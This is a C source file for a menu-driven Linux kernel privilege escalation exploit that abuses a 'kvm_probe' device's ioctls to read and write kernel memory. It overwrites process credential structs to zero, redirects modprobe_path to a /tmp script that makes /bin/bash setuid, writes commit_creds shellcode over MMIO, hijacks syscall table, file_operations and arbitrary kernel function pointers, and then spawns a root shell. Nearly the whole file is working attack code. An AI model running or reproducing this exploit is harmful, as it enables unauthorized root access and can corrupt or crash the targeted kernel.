#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <inttypes.h>
#include <sys/syscall.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct va_scan_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct va_write_data {
    unsigned long va;
    unsigned long size;
    unsigned char *user_buffer;
};

struct mmio_write_data {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kernel_offsets {
    unsigned long prepare_kernel_cred;
    unsigned long commit_creds;
    unsigned long modprobe_path;
    unsigned long init_task;
    unsigned long init_cred;
};

// Helper function to get symbol name (placeholder)
const char* get_kernel_symbol_name(unsigned long addr) {
    return "unknown";
}

// Function to write to MMIO
int write_mmio(int fd, unsigned long phys_addr, unsigned char *data, size_t length) {
    struct mmio_write_data req;
    req.phys_addr = phys_addr;
    req.length = length;
    req.user_buf = data;

    // Try MMIO write ioctl
    if (ioctl(fd, IOCTL_WRITE_MMIO, &req) < 0) {
        // If MMIO ioctl doesn't exist, fall back to system command
        printf("[!] MMIO ioctl not available, using system command fallback\n");

        // Convert data to hex string for system command
        char hex_cmd[512];
        char hex_data[256] = {0};

        for (size_t i = 0; i < length && i < 255; i++) {
            sprintf(hex_data + i*2, "%02x", data[i]);
        }

        snprintf(hex_cmd, sizeof(hex_cmd), "echo %s | xxd -r -p | kvm_prober writemmio_buf 0x%lx %zu",
                 hex_data, phys_addr, length);

        printf("[*] Executing: %s\n", hex_cmd);
        return system(hex_cmd);
    }

    return 0;
}

// Function to write 4-byte value to MMIO
int write_mmio_dword(int fd, unsigned long phys_addr, unsigned int value) {
    unsigned char data[4];
    data[0] = value & 0xFF;
    data[1] = (value >> 8) & 0xFF;
    data[2] = (value >> 16) & 0xFF;
    data[3] = (value >> 24) & 0xFF;

    return write_mmio(fd, phys_addr, data, 4);
}

unsigned long find_kernel_symbol(const char *symbol_name) {
    FILE *fp;
    char line[256];
    char sym_name[128];
    unsigned long addr;
    char type;

    fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        perror("Failed to open /proc/kallsyms");
        return 0;
    }

    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym_name) == 3) {
            if (strcmp(sym_name, symbol_name) == 0) {
                fclose(fp);
                return addr;
            }
        }
    }

    fclose(fp);
    return 0;
}

unsigned long read_kernel_qword(int fd, unsigned long addr) {
    struct kvm_kernel_mem_read req;
    unsigned long value = 0;

    req.kernel_addr = addr;
    req.length = 8;
    req.user_buf = (unsigned char*)&value;

    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        return 0;
    }
    return value;
}

int write_kernel_qword(int fd, unsigned long addr, unsigned long value) {
    struct kvm_kernel_mem_write req;

    req.kernel_addr = addr;
    req.length = 8;
    req.user_buf = (unsigned char*)&value;

    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        perror("write_kernel_qword failed");
        return -1;
    }
    return 0;
}

int detect_kernel_offsets(struct kernel_offsets *offsets, unsigned long kaslr_slide) {
    printf("[*] Detecting kernel offsets dynamically...\n");

    offsets->prepare_kernel_cred = find_kernel_symbol("prepare_kernel_cred");
    offsets->commit_creds = find_kernel_symbol("commit_creds");
    offsets->modprobe_path = find_kernel_symbol("modprobe_path");
    offsets->init_task = find_kernel_symbol("init_task");
    offsets->init_cred = find_kernel_symbol("init_cred");

    printf("[+] prepare_kernel_cred: 0x%lx\n", offsets->prepare_kernel_cred);
    printf("[+] commit_creds: 0x%lx\n", offsets->commit_creds);
    printf("[+] modprobe_path: 0x%lx\n", offsets->modprobe_path);
    printf("[+] init_task: 0x%lx\n", offsets->init_task);
    printf("[+] init_cred: 0x%lx\n", offsets->init_cred);

    if (!offsets->prepare_kernel_cred || !offsets->commit_creds) {
        printf("[-] Failed to find critical kernel symbols\n");
        return -1;
    }

    return 0;
}

int detect_task_struct_offsets(int fd, struct kernel_offsets *koffsets,
                                unsigned long *cred_offset_out,
                                unsigned long *real_cred_offset_out,
                                unsigned long *pid_offset_out,
                                unsigned long *comm_offset_out) {
    printf("[*] Detecting task_struct field offsets...\n");

    if (!koffsets->init_task || !koffsets->init_cred) {
        printf("[-] Need init_task and init_cred symbols\n");
        return -1;
    }

    unsigned char task_data[0x2000];
    struct kvm_kernel_mem_read req;
    req.kernel_addr = koffsets->init_task;
    req.length = sizeof(task_data);
    req.user_buf = task_data;

    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("Failed to read init_task");
        return -1;
    }

    unsigned long init_cred_addr = koffsets->init_cred;
    int found_cred = 0, found_real_cred = 0;

    for (unsigned long offset = 0; offset < sizeof(task_data) - 8; offset += 8) {
        unsigned long value = *(unsigned long*)(task_data + offset);

        if (value == init_cred_addr) {
            if (!found_cred) {
                *real_cred_offset_out = offset;
                found_cred = 1;
                printf("[+] Found real_cred at offset 0x%lx\n", offset);
            } else if (!found_real_cred) {
                *cred_offset_out = offset;
                found_real_cred = 1;
                printf("[+] Found cred at offset 0x%lx\n", offset);
                break;
            }
        }
    }

    if (!found_cred || !found_real_cred) {
        printf("[-] Could not find cred offsets, using defaults\n");
        *real_cred_offset_out = 0xa30;
        *cred_offset_out = 0xa38;
    }

    *pid_offset_out = 0;
    for (unsigned long offset = 0; offset < 0x500; offset += 4) {
        unsigned int value = *(unsigned int*)(task_data + offset);
        if (value == 1) {
            *pid_offset_out = offset;
            printf("[+] Found pid at offset 0x%lx\n", offset);
            break;
        }
    }

    if (!*pid_offset_out) {
        *pid_offset_out = 0x818;
        printf("[*] Using default pid offset 0x%lx\n", *pid_offset_out);
    }

    *comm_offset_out = 0;
    for (unsigned long offset = 0; offset < 0xc00; offset++) {
        if (memcmp(task_data + offset, "swapper", 7) == 0) {
            *comm_offset_out = offset;
            printf("[+] Found comm at offset 0x%lx\n", offset);
            break;
        }
    }

    if (!*comm_offset_out) {
        *comm_offset_out = 0xac8;
        printf("[*] Using default comm offset 0x%lx\n", *comm_offset_out);
    }

    return 0;
}

unsigned long find_current_task_by_comm(int fd, unsigned long init_task_addr, unsigned long comm_offset) {
    printf("[*] Searching for current task by process name...\n");
    
    char current_comm[16];
    FILE *f = fopen("/proc/self/comm", "r");
    if (!f) {
        printf("[-] Could not read current process name\n");
        return 0;
    }
    fgets(current_comm, sizeof(current_comm), f);
    fclose(f);
    
    // Remove newline
    current_comm[strcspn(current_comm, "\n")] = 0;
    printf("[*] Looking for process with comm: '%s'\n", current_comm);
    
    unsigned long current = init_task_addr;
    int iterations = 0;
    
    // Try different tasks offsets
    unsigned long tasks_offsets[] = {0x818, 0x820, 0x828, 0x830, 0x838, 0x840, 0x848, 0x850};
    
    for (int t = 0; t < sizeof(tasks_offsets)/sizeof(tasks_offsets[0]); t++) {
        printf("[*] Trying tasks_offset 0x%lx...\n", tasks_offsets[t]);
        
        current = init_task_addr;
        iterations = 0;
        
        while (iterations++ < 1000) {
            char comm[16] = {0};
            struct kvm_kernel_mem_read req;
            req.kernel_addr = current + comm_offset;
            req.length = 16;
            req.user_buf = (unsigned char*)comm;
            
            if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
                if (strcmp(comm, current_comm) == 0) {
                    printf("[+] Found our task_struct at 0x%lx (tasks_offset=0x%lx)\n", 
                           current, tasks_offsets[t]);
                    return current;
                }
            }
            
            unsigned long next_ptr = read_kernel_qword(fd, current + tasks_offsets[t]);
            if (!next_ptr || next_ptr == current + tasks_offsets[t]) {
                break;
            }
            current = next_ptr - tasks_offsets[t];
        }
    }
    
    printf("[-] Could not find task by comm\n");
    return 0;
}

unsigned long find_current_task_by_pid(int fd, unsigned long init_task_addr,
                                       unsigned long pid_offset, unsigned long tasks_offset) {
    printf("[*] Searching for current task (PID %d)...\n", getpid());

    if (tasks_offset == 0) {
        tasks_offset = 0x848;
    }

    unsigned long current = init_task_addr;
    int iterations = 0;
    int our_pid = getpid();

    printf("[*] Starting from init_task at 0x%lx, tasks_offset=0x%lx, pid_offset=0x%lx\n",
           init_task_addr, tasks_offset, pid_offset);

    while (iterations++ < 50000) {
        unsigned int pid = 0;
        struct kvm_kernel_mem_read req;
        req.kernel_addr = current + pid_offset;
        req.length = 4;
        req.user_buf = (unsigned char*)&pid;

        if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
            printf("[!] Failed to read PID at iteration %d from 0x%lx\n", iterations, current);
            break;
        }

        if (iterations % 1000 == 0) {
            printf("[*] Iteration %d: current=0x%lx, pid=%d\n", iterations, current, pid);
        }

        if (pid == our_pid) {
            printf("[+] Found our task_struct at 0x%lx after %d iterations\n", current, iterations);

            char comm[16] = {0};
            req.kernel_addr = current + 0xac8;
            req.length = 16;
            req.user_buf = (unsigned char*)comm;

            if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
                printf("[+] Process name: %s\n", comm);
            }

            return current;
        }

        unsigned long next_ptr = read_kernel_qword(fd, current + tasks_offset);

        // Better validation of next pointer
        if (next_ptr == 0) {
            printf("[!] Hit null pointer at iteration %d\n", iterations);
            break;
        }

        if (next_ptr == current + tasks_offset) {
            printf("[!] Hit list cycle (looped back to same task) at iteration %d\n", iterations);
            break;
        }

        // Check if pointer looks valid (should be in kernel space)
        if (next_ptr < 0xffff800000000000UL) {
            printf("[!] Invalid next_ptr 0x%lx at iteration %d (not in kernel space)\n", next_ptr, iterations);
            break;
        }

        current = next_ptr - tasks_offset;
    }

    printf("[-] Could not find our task after %d iterations\n", iterations);
    return 0;
}

int detect_cred_offsets(int fd, unsigned long init_cred_addr,
                       unsigned long *uid_offset,
                       unsigned long *gid_offset,
                       unsigned long *euid_offset,
                       unsigned long *egid_offset) {
    printf("[*] Detecting cred structure offsets...\n");

    unsigned char cred_data[0x200];
    struct kvm_kernel_mem_read req;
    req.kernel_addr = init_cred_addr;
    req.length = sizeof(cred_data);
    req.user_buf = cred_data;

    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("Failed to read init_cred");
        return -1;
    }

    int zero_count = 0;
    unsigned long first_zero_offset = 0;

    for (unsigned long offset = 0; offset < 0x100; offset += 4) {
        unsigned int value = *(unsigned int*)(cred_data + offset);
        if (value == 0 && zero_count == 0) {
            first_zero_offset = offset;
            zero_count++;
        } else if (value == 0 && zero_count > 0 && offset == first_zero_offset + 4 * zero_count) {
            zero_count++;
        } else if (zero_count >= 8) {
            break;
        } else if (value != 0) {
            zero_count = 0;
            first_zero_offset = 0;
        }
    }

    if (zero_count >= 8) {
        *uid_offset = first_zero_offset;
        *gid_offset = first_zero_offset + 4;
        *euid_offset = first_zero_offset + 16;
        *egid_offset = first_zero_offset + 20;

        printf("[+] Found credential offsets starting at 0x%lx\n", *uid_offset);
        return 0;
    }

    *uid_offset = 0x04;
    *gid_offset = 0x08;
    *euid_offset = 0x14;
    *egid_offset = 0x18;

    printf("[*] Using typical credential offsets\n");
    return 0;
}

int exploit_modprobe_path(int fd, struct kernel_offsets *koffsets) {
    printf("\n[*] Attempting modprobe_path exploitation...\n");

    if (!koffsets->modprobe_path) {
        printf("[-] modprobe_path address not found\n");
        return -1;
    }

    printf("[*] modprobe_path address: 0x%lx\n", koffsets->modprobe_path);

    struct kvm_kernel_mem_read req;
    char current_path[256] = {0};
    req.kernel_addr = koffsets->modprobe_path;
    req.length = 256;
    req.user_buf = (unsigned char*)current_path;

    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("Failed to read modprobe_path");
        return -1;
    }

    printf("[*] Current modprobe_path: %s\n", current_path);

    const char *exploit_path = "/tmp/evil_modprobe";
    struct kvm_kernel_mem_write wreq;
    wreq.kernel_addr = koffsets->modprobe_path;
    wreq.length = strlen(exploit_path) + 1;
    wreq.user_buf = (unsigned char*)exploit_path;

    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &wreq) < 0) {
        perror("Failed to write modprobe_path");
        return -1;
    }

    printf("[+] Successfully overwrote modprobe_path!\n");

    system("echo '#!/bin/sh\nchmod 4777 /bin/bash\necho \"ROOT SHELL READY\"' > /tmp/evil_modprobe");
    system("chmod +x /tmp/evil_modprobe");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake_bin");
    system("chmod +x /tmp/fake_bin");

    printf("[*] Triggering modprobe_path exploit...\n");
    system("/tmp/fake_bin 2>/dev/null");

    printf("[*] Check if /bin/bash is now setuid root!\n");
    system("ls -la /bin/bash");

    return 0;
}

int exploit_cred_struct(int fd, struct kernel_offsets *koffsets) {
    printf("\n[*] Attempting direct credential structure manipulation...\n");

    unsigned long cred_offset = 0, real_cred_offset = 0, pid_offset = 0, comm_offset = 0;
    if (detect_task_struct_offsets(fd, koffsets, &cred_offset, &real_cred_offset, 
                                    &pid_offset, &comm_offset) < 0) {
        printf("[-] Failed to detect task_struct offsets\n");
        return -1;
    }

    // Try to find current task using comm (process name) instead of PID
    unsigned long current_task = find_current_task_by_comm(fd, koffsets->init_task, comm_offset);
    
    if (!current_task) {
        printf("[-] Could not find current task_struct\n");
        return -1;
    }

    // Rest of the function remains the same...
    unsigned long real_cred_ptr_addr = current_task + real_cred_offset;
    unsigned long cred_ptr_addr = current_task + cred_offset;

    printf("[*] Reading cred pointers...\n");
    unsigned long real_cred_struct = read_kernel_qword(fd, real_cred_ptr_addr);
    unsigned long cred_struct = read_kernel_qword(fd, cred_ptr_addr);

    if (real_cred_struct < 0xffff800000000000UL || cred_struct < 0xffff800000000000UL) {
        printf("[-] Invalid cred pointers: real_cred=0x%lx, cred=0x%lx\n", 
               real_cred_struct, cred_struct);
        return -1;
    }

    printf("[+] Found real_cred structure at: 0x%lx\n", real_cred_struct);
    printf("[+] Found cred structure at: 0x%lx\n", cred_struct);

    unsigned long uid_off, gid_off, euid_off, egid_off;
    if (detect_cred_offsets(fd, koffsets->init_cred, &uid_off, &gid_off, 
                           &euid_off, &egid_off) < 0) {
        printf("[-] Failed to detect cred offsets\n");
        return -1;
    }

    printf("[*] Overwriting credentials to root (0)...\n");

    unsigned int zero = 0;
    struct kvm_kernel_mem_write wreq;
    wreq.length = 4;
    wreq.user_buf = (unsigned char*)&zero;

    unsigned long offsets[] = {uid_off, gid_off, uid_off + 8, gid_off + 8, 
                              euid_off, egid_off, euid_off + 8, egid_off + 8};

    unsigned long cred_structs[] = {real_cred_struct, cred_struct};

    for (int s = 0; s < 2; s++) {
        for (int i = 0; i < 8; i++) {
            wreq.kernel_addr = cred_structs[s] + offsets[i];
            if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &wreq) < 0) {
                perror("Failed to write credential field");
                continue;
            }
        }
    }

    printf("[+] Credentials overwritten!\n");

    setuid(0);
    setgid(0);

    printf("[*] Current UID: %d, GID: %d, EUID: %d, EGID: %d\n", 
           getuid(), getgid(), geteuid(), getegid());

    if (getuid() == 0 && geteuid() == 0) {
        printf("[+] SUCCESS! Got root!\n");
        return 0;
    } else {
        printf("[-] Still not root, credential write may have failed\n");
        return -1;
    }
}

int exploit_code_injection(int fd, struct kernel_offsets *koffsets) {
    printf("\n[*] Attempting kernel code injection via MMIO...\n");

    if (!koffsets->prepare_kernel_cred || !koffsets->commit_creds) {
        printf("[-] Missing required kernel function addresses\n");
        return -1;
    }

    unsigned char shellcode[] = {
        0x48, 0x31, 0xff,                          // xor rdi, rdi
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, [prepare_kernel_cred]
        0xff, 0xd0,                                // call rax
        0x48, 0x89, 0xc7,                          // mov rdi, rax
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, [commit_creds]
        0xff, 0xd0,                                // call rax
        0xc3                                       // ret
    };

    // Fill in function addresses
    *(unsigned long*)(shellcode + 3) = koffsets->prepare_kernel_cred;
    *(unsigned long*)(shellcode + 16) = koffsets->commit_creds;

    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));
    printf("[*] prepare_kernel_cred: 0x%lx\n", koffsets->prepare_kernel_cred);
    printf("[*] commit_creds: 0x%lx\n", koffsets->commit_creds);

    // Calculate the correct virtual address
    // Kernel base is typically 0xffffffff81000000, our physical is 0x10371c0
    // So virtual should be: kernel_base + (physical - 0x1000000)
    unsigned long physical_addr = 0x10371c0;
    unsigned long kernel_base = koffsets->prepare_kernel_cred & 0xfffffffff0000000UL;
    unsigned long virtual_addr = kernel_base + (physical_addr - 0x1000000);
    
    printf("[*] Kernel base: 0x%lx\n", kernel_base);
    printf("[*] Physical target: 0x%lx\n", physical_addr);
    printf("[*] Virtual mapping: 0x%lx\n", virtual_addr);

    printf("\n[*] Writing shellcode via MMIO...\n");

    // Pad shellcode to multiple of 4 bytes
    size_t padded_size = (sizeof(shellcode) + 3) & ~3;
    unsigned char padded_shellcode[padded_size];
    memcpy(padded_shellcode, shellcode, sizeof(shellcode));
    memset(padded_shellcode + sizeof(shellcode), 0x90, padded_size - sizeof(shellcode));

    // Write shellcode in 4-byte chunks via MMIO
    int success_count = 0;
    for (size_t i = 0; i < padded_size; i += 4) {
        unsigned int value = *(unsigned int*)(padded_shellcode + i);

        printf("[*] Writing to 0x%lx: 0x%08x", physical_addr + i, value);

        if (write_mmio_dword(fd, physical_addr + i, value) == 0) {
            printf(" [OK]");
            success_count++;
        } else {
            printf(" [FAIL]");
        }
        printf("\n");
    }

    printf("[+] Successfully wrote %d/%zu chunks via MMIO\n", success_count, padded_size / 4);

    // Try to verify, but don't crash if it fails
    printf("\n[*] Attempting to verify shellcode...\n");
    
    unsigned char verify_buf[sizeof(shellcode)];
    struct kvm_kernel_mem_read req;
    req.kernel_addr = virtual_addr;
    req.length = sizeof(verify_buf);
    req.user_buf = verify_buf;

    // Use a signal handler to catch segmentation faults
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
        if (memcmp(shellcode, verify_buf, sizeof(shellcode)) == 0) {
            printf("[+] Shellcode verification successful!\n");

            // Print the shellcode for manual verification
            printf("\n[*] Shellcode bytes at 0x%lx:\n", virtual_addr);
            for (size_t i = 0; i < sizeof(shellcode); i += 16) {
                printf("  0x%04lx: ", i);
                for (size_t j = 0; j < 16 && i+j < sizeof(shellcode); j++) {
                    printf("%02x ", verify_buf[i+j]);
                }
                printf("\n");
            }
        } else {
            printf("[-] Shellcode verification failed - bytes don't match\n");
            printf("[!] Continuing anyway - MMIO write may have succeeded\n");
        }
    } else {
        printf("[-] Could not read back shellcode for verification\n");
        printf("[!] This is normal if the virtual address isn't mapped\n");
        printf("[!] Continuing with exploitation...\n");
    }

    return (success_count == padded_size / 4) ? 0 : -1;
}

// ==================== TRIGGER METHODS ====================

int trigger_via_syscall_table(int fd, struct kernel_offsets *koffsets, unsigned long shellcode_addr) {
    printf("\n[*] Attempting to hijack system call table...\n");
    
    // Find the system call table
    unsigned long sys_call_table = find_kernel_symbol("sys_call_table");
    if (!sys_call_table) {
        printf("[-] Could not find sys_call_table\n");
        return -1;
    }
    
    printf("[+] sys_call_table at: 0x%lx\n", sys_call_table);
    
    // Try to find an unused syscall number (often around 300-400)
    for (int syscall_num = 300; syscall_num < 400; syscall_num++) {
        unsigned long syscall_entry = sys_call_table + (syscall_num * 8);
        unsigned long current_handler = read_kernel_qword(fd, syscall_entry);
        
        // Look for sys_ni_syscall (null syscall handler)
        if (current_handler == find_kernel_symbol("sys_ni_syscall")) {
            printf("[+] Found unused syscall %d at 0x%lx\n", syscall_num, syscall_entry);
            
            if (write_kernel_qword(fd, syscall_entry, shellcode_addr) == 0) {
                printf("[+] Hijacked syscall %d!\n", syscall_num);
                printf("[*] Triggering via syscall(%d)...\n", syscall_num);
                
                // Trigger via syscall
                syscall(syscall_num);
                return 0;
            }
        }
    }
    
    printf("[-] No suitable syscall found to hijack\n");
    return -1;
}

int trigger_via_file_ops(int fd, unsigned long shellcode_addr) {
    printf("\n[*] Attempting to hijack file operations...\n");
    
    // Common file_operations structures to target
    const char* file_ops_symbols[] = {
        "proc_kcore_operations",
        "proc_modules_operations", 
        "mem_fops",
        "zero_fops",
        "full_fops",
        "null_fops",
        NULL
    };
    
    for (int i = 0; file_ops_symbols[i] != NULL; i++) {
        unsigned long file_ops = find_kernel_symbol(file_ops_symbols[i]);
        if (!file_ops) continue;
        
        printf("[*] Trying %s at 0x%lx\n", file_ops_symbols[i], file_ops);
        
        // Try to overwrite common function pointers in file_operations
        // open, read, write, etc. are usually at the beginning
        for (int offset = 0; offset < 0x80; offset += 8) {
            unsigned long current_func = read_kernel_qword(fd, file_ops + offset);
            
            // If there's a valid function pointer here, overwrite it
            if (current_func > 0xffffffff80000000UL && current_func < 0xffffffffc0000000UL) {
                if (write_kernel_qword(fd, file_ops + offset, shellcode_addr) == 0) {
                    printf("[+] Hijacked %s+0x%x (was: 0x%lx)\n", 
                           file_ops_symbols[i], offset, current_func);
                    printf("[*] Trigger by accessing corresponding file\n");
                    
                    // Try to trigger
                    if (strstr(file_ops_symbols[i], "kcore")) {
                        system("timeout 1 cat /proc/kcore 2>/dev/null &");
                    } else if (strstr(file_ops_symbols[i], "modules")) {
                        system("cat /proc/modules &");
                    } else if (strstr(file_ops_symbols[i], "mem")) {
                        system("timeout 1 cat /dev/mem 2>/dev/null &");
                    }
                    
                    sleep(1);
                    return 0;
                }
            }
        }
    }
    
    return -1;
}

int trigger_via_function_ptr_scan(int fd, struct kernel_offsets *koffsets, unsigned long shellcode_addr) {
    printf("\n[*] Scanning for function pointers to overwrite...\n");
    
    unsigned long kernel_base = koffsets->prepare_kernel_cred & 0xfffffffff0000000UL;
    int found = 0;
    
    printf("[*] Scanning kernel memory range 0x%lx - 0x%lx\n", 
           kernel_base + 0x100000, kernel_base + 0x500000);
    
    // Scan a smaller range first for efficiency
    for (unsigned long addr = kernel_base + 0x100000; 
         addr < kernel_base + 0x500000 && !found; 
         addr += 8) {
        
        unsigned long value = read_kernel_qword(fd, addr);
        
        // Check if this looks like a function pointer to kernel code
        if (value >= kernel_base && value < kernel_base + 0x1000000) {
            // Try to overwrite it
            if (write_kernel_qword(fd, addr, shellcode_addr) == 0) {
                printf("[+] Hijacked function pointer at 0x%lx (was: 0x%lx)\n", addr, value);
                found = 1;
                
                // Give it some time to potentially get called
                printf("[*] Waiting for potential trigger...\n");
                for (int i = 0; i < 10 && getuid() != 0; i++) {
                    sleep(1);
                    // Generate some system activity
                    system("ls /proc/ > /dev/null 2>&1");
                }
                
                if (getuid() == 0) {
                    return 0;
                }
            }
        }
        
        // Progress indicator
        if ((addr - (kernel_base + 0x100000)) % 0x10000 == 0) {
            printf("[*] Scanned 0x%lx bytes...\n", addr - (kernel_base + 0x100000));
        }
    }
    
    if (!found) {
        printf("[-] No suitable function pointers found in scanned range\n");
    }
    
    return -1;
}

int trigger_shellcode(int fd, struct kernel_offsets *koffsets) {
    printf("\n[*] Attempting to trigger injected shellcode...\n");
    
    unsigned long shellcode_virt_addr = 0xffffffff810371c0;
    
    printf("[*] Shellcode virtual address: 0x%lx\n", shellcode_virt_addr);
    
    // Try multiple trigger methods
    int methods[] = {2, 1, 3}; // File ops, syscall, function pointer scan
    
    for (int i = 0; i < sizeof(methods)/sizeof(methods[0]); i++) {
        printf("\n[=== TRYING TRIGGER METHOD %d ===]\n", methods[i]);
        
        int result = -1;
        switch(methods[i]) {
            case 1:
                result = trigger_via_syscall_table(fd, koffsets, shellcode_virt_addr);
                break;
            case 2:
                result = trigger_via_file_ops(fd, shellcode_virt_addr);
                break;
            case 3:
                result = trigger_via_function_ptr_scan(fd, koffsets, shellcode_virt_addr);
                break;
        }
        
        // Check if we got root
        if (getuid() == 0) {
            printf("\n[+] SUCCESS! Got root privileges via method %d!\n", methods[i]);
            return 0;
        } else if (result == 0) {
            printf("[*] Trigger method %d executed but no root yet\n", methods[i]);
        }
    }
    
    printf("\n[-] All trigger methods attempted but no root\n");
    printf("[*] The shellcode might need adjustment or different trigger point\n");
    return -1;
}

// ==================== MAIN EXPLOIT FLOW ====================

int exploit_with_trigger(int fd, struct kernel_offsets *koffsets) {
    printf("\n[=== STARTING COMPLETE EXPLOIT ===]\n");
    
    // Step 1: Inject shellcode
    if (exploit_code_injection(fd, koffsets) < 0) {
        printf("[-] Shellcode injection failed\n");
        return -1;
    }
    
    // Step 2: Trigger the shellcode
    if (trigger_shellcode(fd, koffsets) == 0) {
        return 0;
    }
    
    return -1;
}

void print_menu() {
    printf("\n=== Privilege Escalation Exploit Menu ===\n");
    printf("1. Direct Credential Manipulation (recommended)\n");
    printf("2. modprobe_path Exploitation\n");
    printf("3. Kernel Code Injection Only\n");
    printf("4. Complete Code Injection + Trigger\n");
    printf("5. Auto-detect and exploit\n");
    printf("6. Exit\n");
    printf("Choose method: ");
}

int main(int argc, char *argv[]) {
    int fd;
    unsigned long kaslr_slide = 0;
    struct kernel_offsets koffsets = {0};

    printf("[*] KVM Probe Privilege Escalation Exploit\n");
    printf("[*] With Code Injection and Triggering\n");
    printf("[*] Opening device %s\n", DEVICE_PATH);

    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        printf("[-] Make sure the kvm_probe_drv module is loaded\n");
        return 1;
    }

    printf("[*] Getting KASLR slide...\n");
    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &kaslr_slide) < 0) {
        perror("Failed to get KASLR slide");
        close(fd);
        return 1;
    }

    printf("[+] KASLR slide: 0x%lx\n", kaslr_slide);

    if (detect_kernel_offsets(&koffsets, kaslr_slide) < 0) {
        printf("[-] Failed to detect kernel offsets\n");
        printf("[!] Make sure you have read access to /proc/kallsyms\n");
        printf("[!] You may need to: sudo sysctl kernel.kptr_restrict=0\n");
        close(fd);
        return 1;
    }

    printf("\n[*] Kernel symbol addresses detected:\n");
    printf("    prepare_kernel_cred: 0x%lx\n", koffsets.prepare_kernel_cred);
    printf("    commit_creds:        0x%lx\n", koffsets.commit_creds);
    printf("    modprobe_path:       0x%lx\n", koffsets.modprobe_path);
    printf("    init_task:           0x%lx\n", koffsets.init_task);
    printf("    init_cred:           0x%lx\n", koffsets.init_cred);

    if (argc > 1) {
        int method = atoi(argv[1]);
        switch(method) {
            case 1:
                exploit_cred_struct(fd, &koffsets);
                break;
            case 2:
                exploit_modprobe_path(fd, &koffsets);
                break;
            case 3:
                exploit_code_injection(fd, &koffsets);
                break;
            case 4:
                exploit_with_trigger(fd, &koffsets);
                break;
            default:
                printf("[-] Invalid method\n");
        }
    } else {
        int choice;
        while (1) {
            print_menu();
            if (scanf("%d", &choice) != 1) {
                while(getchar() != '\n');
                continue;
            }

            switch(choice) {
                case 1:
                    if (exploit_cred_struct(fd, &koffsets) == 0) {
                        printf("\n[+] Exploitation successful!\n");
                        printf("[*] Spawning root shell...\n");
                        system("/bin/bash -i");
                        close(fd);
                        return 0;
                    }
                    break;
                case 2:
                    exploit_modprobe_path(fd, &koffsets);
                    break;
                case 3:
                    exploit_code_injection(fd, &koffsets);
                    break;
                case 4:
                    if (exploit_with_trigger(fd, &koffsets) == 0) {
                        printf("\n[+] Code injection and trigger successful!\n");
                        printf("[*] Spawning root shell...\n");
                        system("/bin/bash -i");
                        close(fd);
                        return 0;
                    }
                    break;
                case 5:
                    printf("[*] Auto-detect mode: Trying methods in order...\n");
                    if (exploit_cred_struct(fd, &koffsets) == 0 ||
                        exploit_with_trigger(fd, &koffsets) == 0 ||
                        exploit_modprobe_path(fd, &koffsets) == 0) {
                        printf("[*] Spawning root shell...\n");
                        system("/bin/bash -i");
                        close(fd);
                        return 0;
                    }
                    break;
                case 6:
                    close(fd);
                    return 0;
                default:
                    printf("[-] Invalid choice\n");
            }
            
            // Check if we got root from any method
            if (getuid() == 0) {
                printf("\n[+] Got root privileges!\n");
                printf("[*] Spawning root shell...\n");
                system("/bin/bash -i");
                close(fd);
                return 0;
            }
        }
    }

    close(fd);
    return 0;
}
